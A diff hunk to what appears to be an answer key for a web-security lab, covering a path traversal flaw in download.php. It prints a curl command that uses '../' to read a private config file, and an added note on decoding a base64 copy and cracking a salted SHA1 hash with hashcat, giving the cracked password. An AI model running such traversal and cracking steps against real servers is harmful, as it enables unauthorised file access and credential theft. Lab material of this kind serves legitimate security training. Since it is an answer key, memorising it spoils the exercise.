@@ -131,6 +131,8 @@ enabled. Deck: XXE.
 
 ## 5. Path traversal  (`download.php?file=`)
 **Answer:** `file` is appended to `docs/` with no sanitisation → climb out.
+Decode/crack reps: the target dir also has `secret_config.b64` (`base64 -d`) and `secret_config.sha1salt`
+(`svc:<sha1>:<salt>` → `hashcat -m 110` → `shadow`), reachable with the same `../` traversal.
 **Command:**
 ```
 curl -sG "$B/download.php" --data-urlencode "file=../private2/secret_config.txt"
